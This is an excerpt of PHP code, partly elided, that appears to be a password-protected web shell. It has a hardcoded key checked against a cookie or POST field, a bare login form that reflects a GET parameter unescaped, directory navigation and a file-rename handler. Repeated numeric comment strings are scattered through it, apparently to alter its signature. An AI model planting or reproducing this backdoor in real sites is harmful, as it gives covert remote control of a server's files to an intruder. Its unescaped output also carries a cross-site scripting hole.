...
$auth_key = "fe15f611c213653d240ee92429a26071";
...
$pass = false;
if (isset($_COOKIE['pw_name_36345'])) {
    if(($_COOKIE['pw_name_36345']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_36345'])) {
        if(($_POST['pw_name_36345']) == $auth_key) {
            setcookie("pw_name_36345", $_POST['pw_name_36345']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_36345' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1743051576200797 1743051576473889 1743051576746014 1743051576164000
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1743051576200797 1743051576473889 1743051576746014 1743051576164000
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1743051576200797 1743051576473889 1743051576746014 1743051576164000
            $name = PATH . "/" . $_GET['r'];
